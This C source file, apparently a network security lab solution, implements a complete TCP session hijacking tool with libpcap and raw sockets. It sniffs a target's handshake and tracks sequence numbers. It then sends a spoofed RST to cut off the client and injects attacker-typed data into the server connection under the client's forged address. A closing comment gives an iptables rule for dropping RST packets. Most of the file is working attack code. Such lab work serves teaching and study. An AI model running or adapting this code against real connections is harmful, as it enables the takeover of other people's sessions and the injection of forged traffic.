/*
 * pcap_example.c
 *
 *  Created on: Apr 28, 2016
 *      Author: jiaziyi
 */



#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include <unistd.h>
#include <pcap.h>
#include <pthread.h>

#include "header.h"



#include "tcp_hijack.h"
#include "header.h"
// #include "dns.h"



#define MAX 128
#define size_TcpOption 12 //timestamps 12 bytes


//some global counter
int tcp=0,udp=0,icmp=0,others=0,igmp=0,total=0,i,j;
u_int32_t client_ipaddr,server_ipaddr; 
u_int16_t client_port,server_port;
int  client_seq=0,client_ack_seq=0,server_seq=0,server_ack_seq=0; //host number
int is_syn=0,is_syn_ack=0,is_ack=0;
int send_thread_creat=0;//a bool to deal with creating sending thread
pthread_t sending_thread;

int fd;    
struct sockaddr_in to;




int main(int argc, char *argv[])
{
	pcap_t *handle;
	pcap_if_t *all_dev, *dev;

	char err_buf[PCAP_ERRBUF_SIZE], dev_list[30][2];
	char *dev_name;
	bpf_u_int32 net_ip, mask;

	//get all available devices
	if (pcap_findalldevs(&all_dev, err_buf))
	{
		fprintf(stderr, "Unable to find devices: %s", err_buf);
		exit(1);
	}

	if (all_dev == NULL)
	{
		fprintf(stderr, "No device found. Please check that you are running with root \n");
		exit(1);
	}

	printf("Available devices list: \n");
	int c = 1;

	for (dev = all_dev; dev != NULL; dev = dev->next)
	{
		printf("#%d %s : %s \n", c, dev->name, dev->description);
		if (dev->name != NULL)
		{
			strncpy(dev_list[c], dev->name, strlen(dev->name));
		}
		c++;
	}

	printf("Please choose the monitoring device (e.g., en0):\n");
	dev_name = malloc(20);
	// fgets(dev_name, 20, stdin);
	// *(dev_name + strlen(dev_name) - 1) = '\0'; //the pcap_open_live don't take the last \n in the end

	//look up the chosen device
	dev_name = "vboxnet0"; // For testing purpose.
	int ret = pcap_lookupnet(dev_name, &net_ip, &mask, err_buf);
	if (ret < 0)
	{
		fprintf(stderr, "Error looking up net: %s \n", dev_name);
		exit(1);
	}

	struct sockaddr_in addr;
	addr.sin_addr.s_addr = net_ip;
	char ip_char[100];
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	printf("NET address: %s\n", ip_char);

	addr.sin_addr.s_addr = mask;
	memset(ip_char, 0, 100);
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	printf("Mask: %s\n", ip_char);

	//Create the handle
	if (!(handle = pcap_create(dev_name, err_buf)))
	{
		fprintf(stderr, "Pcap create error : %s", err_buf);
		exit(1);
	}

	//If the device can be set in monitor mode (WiFi), we set it.
	//Otherwise, promiscuous mode is set
	if (pcap_can_set_rfmon(handle) == 1)
	{
		if (pcap_set_rfmon(handle, 1))
			pcap_perror(handle, "Error while setting monitor mode");
	}

	if (pcap_set_promisc(handle, 1))
		pcap_perror(handle, "Error while setting promiscuous mode");

	//Setting timeout for processing packets to 1 ms
	if (pcap_set_timeout(handle, 1))
		pcap_perror(handle, "Pcap set timeout error");

	//Activating the sniffing handle
	if (pcap_activate(handle))
		pcap_perror(handle, "Pcap activate error");

	// the the link layer header type
	// see http://www.tcpdump.org/linktypes.html
	header_type = pcap_datalink(handle);

	//BEGIN_SOLUTION
	//	char filter_exp[] = "host 192.168.1.100";	/* The filter expression */

	char filter_exp[] = "host 192.168.56.101 && tcp"; // capture all the packet from and to this ip addr.
	//	char filter_exp[] = "udp && port 53";
	struct bpf_program fp; /* The compiled filter expression */

	if (pcap_compile(handle, &fp, filter_exp, 0, net_ip) == -1)
	{
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return (2);
	}
	if (pcap_setfilter(handle, &fp) == -1)
	{
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return (2);
	}

	//END_SOLUTION

	if (handle == NULL)
	{
		fprintf(stderr, "Unable to open device %s: %s\n", dev_name, err_buf);
		exit(1);
	}

	printf("Device %s is opened. Begin sniffing with filter %s...\n", dev_name, filter_exp);

	logfile = fopen("log.txt", "w");
	if (logfile == NULL)
	{
		printf("Unable to create file.");
	}

	/*
	 	Starting from here
	*/

	// Creating socket 


	fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	int hincl =1 ;                  /* 1 = on, 0 = off */
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

	if(fd < 0){
		perror("Error creating raw socket ");
		exit(1);
	}

	pcap_loop(handle , -1 , process_packet , NULL);

	pcap_close(handle);

	return 0;

}

void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer){


	// printf("a packet is received! %d \n", total++);
	int size = header->len;
	// print_tcp_packet(buffer,size);
		// print_udp_packet(buffer, size);

	//	PrintData(buffer, size);

	//Finding the beginning of IP header
	struct iphdr *in_iphr;

	switch (header_type)
	{
	case LINKTYPE_ETH:
		in_iphr = (struct iphdr*)(buffer + sizeof(struct ethhdr)); //For ethernet
		size -= sizeof(struct ethhdr);
		break;

	case LINKTYPE_NULL:
		in_iphr = (struct iphdr*)(buffer + 4);
		size -= 4;
		break;

	case LINKTYPE_WIFI:
		in_iphr = (struct iphdr*)(buffer + 57);
		size -= 57;
		break;

	default:
		fprintf(stderr, "Unknown header type %d\n", header_type);
		exit(1);
	}

    unsigned short iphdrlen;
	// print_tcp_ip_header(in_iphr,size); // Just to print the header. 
	iphdrlen = in_iphr->ihl*4;
	struct tcphdr *in_tcphdr = (struct tcphdr *)(in_iphr +1);
    char * p_data = (char *)(in_tcphdr +1);
	p_data = p_data+size_TcpOption;
	int data_len= size - sizeof(struct tcphdr)-iphdrlen-size_TcpOption;


	if(is_syn==1 && is_ack==1 &&is_syn_ack==1){// right after capture ack packet 
		if(in_iphr->saddr==server_ipaddr){// Reading message from server. 
			if(htonl(in_tcphdr->seq)==client_ack_seq && data_len>0){
				printf("Byte Data recieve:%d\n",data_len);
				char strdata[data_len+1];
				strncpy(strdata,p_data,data_len);
				printf("From the server:%s\n",strdata);
				client_ack_seq = ntohl(in_tcphdr->seq)+max(1,data_len);
			}
		}
		
	}else{// three ways handshake.
		if(in_tcphdr->syn==1&&in_tcphdr->ack==0){ // syn packet
			client_ipaddr=in_iphr->saddr;
			server_ipaddr=in_iphr->daddr;
			client_port=in_tcphdr->source;
			server_port=in_tcphdr->dest;
			is_syn=1;
		}else if(in_tcphdr->syn==1 && in_tcphdr->ack==1) { // syn-ack packet
			server_seq=ntohl(in_tcphdr->seq)+1;
			server_ack_seq=ntohl(in_tcphdr->ack_seq);
			is_syn_ack=1;
			// print_tcp_ip_header(in_iphr,size);
		}else if(is_syn_ack && in_tcphdr->syn==0&&in_tcphdr->ack==1){ //ack packet
			is_ack=1;
			client_seq=ntohl(in_tcphdr->seq);
			client_ack_seq=ntohl(in_tcphdr->ack_seq);
			send_rst_back();	
			pthread_create(&sending_thread,NULL,send_thread,NULL); // Creating a thread to deal with sending packet,and created only once. 
		}
	}
}

void send_rst_back(){
	sleep(1);
	char send_packet[65536];
	memset(send_packet, 0, 65536);
	
	struct iphdr *iph = (struct iphdr *)send_packet;
	struct tcphdr *tcph = (struct tcphdr *)(send_packet + sizeof(struct iphdr));
		
	// fil up ip_ header and tcp_header
	iph->version=4;
	iph->ihl=5;// there 5*4 byte
	iph->tos=0; 
	iph->tot_len=sizeof(struct iphdr)+sizeof(struct tcphdr);    

	iph->id=htons(1);
	iph->frag_off=0;
	iph->ttl=255;
	iph->protocol=IPPROTO_TCP; // tcp service https://www.iana.org/assignments/protocol-numbers/protocol-numbers.xhtml
	iph->check=0;
	iph->saddr= server_ipaddr; //find source random_ip;	
	iph->daddr=client_ipaddr;
	iph->check=checksum((unsigned short *)iph, sizeof(struct iphdr));
	tcph ->source = server_port;
	tcph ->dest =client_port;
	tcph->seq = htonl(server_seq);
	
	tcph->ack_seq =0; //htonl(server_ack_seq);
	tcph->doff = 5;		/* first and only tcp segment */
	tcph->fin=0;
	tcph->syn=0;
	tcph->rst=1;
	tcph->psh=0;
	tcph->ack=1;
	tcph->urg=0;
	tcph->window = htons (5840);	/* maximum allowed window size */
	tcph->check = 0;/* if you set a checksum to zero, your kernel's IP stack
				should fill in the correct checksum during transmission */
	tcph->urg_ptr = 0;
	
	struct pseudo_header psh;

	//fill the TCP pseudo header
	psh.source_address=server_ipaddr;//iph->saddr;
	psh.dest_address=client_ipaddr;//iph->daddr;
	psh.placeholder=0;
	psh.protocol=IPPROTO_TCP;
	psh.tcp_length=htons(sizeof(struct tcphdr));
	
	
	struct sockaddr_in to;
    memset(&to,0,sizeof(struct sockaddr_in));
    to.sin_family=AF_INET;
    to.sin_port=tcph->dest;
	to.sin_addr.s_addr=iph->daddr;
	int psize=sizeof(struct pseudo_header) + sizeof(struct tcphdr);
	char *pseudogram=malloc(psize);
	memcpy(pseudogram, (char *)&psh,sizeof(struct pseudo_header));
	memcpy(pseudogram+sizeof(struct pseudo_header),tcph,sizeof(struct tcphdr));

	tcph->check=checksum((unsigned short *) pseudogram,psize);
	free(pseudogram);

	//Send the packet
	// print_tcp_ip_header(send_packet,iph->tot_len);

		
	if (sendto (fd,		/* our socket */
				send_packet,	/* the buffer containing headers and data */
				iph->tot_len,	/* total length of our datagram */
				0,		/* routing flags, normally always 0 */
				(struct sockaddr *) &to,	/* socket addr, just like in */
				sizeof (struct sockaddr_in)) < 0)		/* a normal send() */
	{
		printf ("error\n");
	}
	//Data send successfully
	else
	{
		printf ("RST Packet Send \n");
	}

}

void *send_thread(){
    for (;;) {
		char send_packet[65536];
		memset(send_packet, 0, 65536);
		
		struct iphdr *iph = (struct iphdr *)send_packet;
		struct tcphdr *tcph = (struct tcphdr *)(iph +1);
		char *data = (char *)(tcph+1);
		int datalen=0;
		int header_size = sizeof(struct iphdr)+sizeof(struct tcphdr);
        printf("What do you want to send\n");
        fflush(stdout);
        
		while ((data[datalen++] = getchar()) != '\n')
            ;
			
		// fil up ip_ header and tcp_header
		iph->version=4;
		iph->ihl=5;// there 5*4 byte
		iph->tos=0; 
		iph->tot_len=header_size+datalen;    

		iph->id=htons(1);
		iph->frag_off=0;
		iph->ttl=255;
		iph->protocol=IPPROTO_TCP; // tcp service https://www.iana.org/assignments/protocol-numbers/protocol-numbers.xhtml
		iph->check=0;
		iph->saddr=client_ipaddr;//find source random_ip;	
		iph->daddr=server_ipaddr;
		iph->check=checksum((unsigned short *)iph, sizeof(struct iphdr));
		
		
		tcph ->source = client_port;
		tcph ->dest = server_port;
		tcph->seq = htonl(client_seq); 
		tcph->ack_seq = htonl(client_ack_seq);

		tcph->doff = 5;		/* first and only tcp segment */
		tcph->fin=0;
		tcph->syn=0;
		tcph->rst=0;
		tcph->psh=0;
		tcph->ack=1;
		tcph->urg=0;
		tcph->window = htons (5840);	/* maximum allowed window size */
		tcph->check = 0;/* if you set a checksum to zero, your kernel's IP stack
					should fill in the correct checksum during transmission */
		tcph->urg_ptr = 0;
		
		struct pseudo_header psh;

		//fill the TCP pseudo header
		psh.source_address=client_ipaddr;
		psh.dest_address=server_ipaddr;
		psh.placeholder=0;
		psh.protocol=IPPROTO_TCP;
		psh.tcp_length=htons(sizeof(struct tcphdr)+strlen(data));
		
		
		int psize=sizeof(struct pseudo_header) + sizeof(struct tcphdr)+strlen(data);
		char *pseudogram=malloc(psize);
		memcpy(pseudogram, (char *)&psh,sizeof(struct pseudo_header));
		memcpy(pseudogram+sizeof(struct pseudo_header),tcph,sizeof(struct tcphdr)+strlen(data));

		tcph->check=checksum((unsigned short *) pseudogram,psize);
		free(pseudogram);

		struct sockaddr_in to;
		memset(&to,0,sizeof(struct sockaddr_in));
		to.sin_family=AF_INET;
		to.sin_port=tcph->dest;
		to.sin_addr.s_addr=iph->daddr;
		
		//Send the packet
		// print_tcp_ip_header(send_packet,iph->tot_len);

			
		if (sendto (fd,		/* our socket */
					send_packet,	/* the buffer containing headers and data */
					iph->tot_len,	/* total length of our datagram */
					0,		/* routing flags, normally always 0 */
					(struct sockaddr *) &to,	/* socket addr, just like in */
					sizeof (struct sockaddr_in)) < 0)		/* a normal send() */
		{
			printf ("error\n");
		}
		//Data send successfully
		else
		{
			printf ("Packet Send \n\n");
			puts("=======");
		}
		// update the seq value for the next send
		client_seq+=datalen;

		usleep(5000);
    }
    return NULL;
}
// iptables -I INPUT -p tcp --tcp-flags ALL RST -j DROP
// tcp && (! tcp.analysis.retransmission && ! tcp.analysis.fast_retransmission) && (tcp.flags.reset == 0)

int max(int num1, int num2)
{
    return (num1 > num2 ) ? num1 : num2;
}

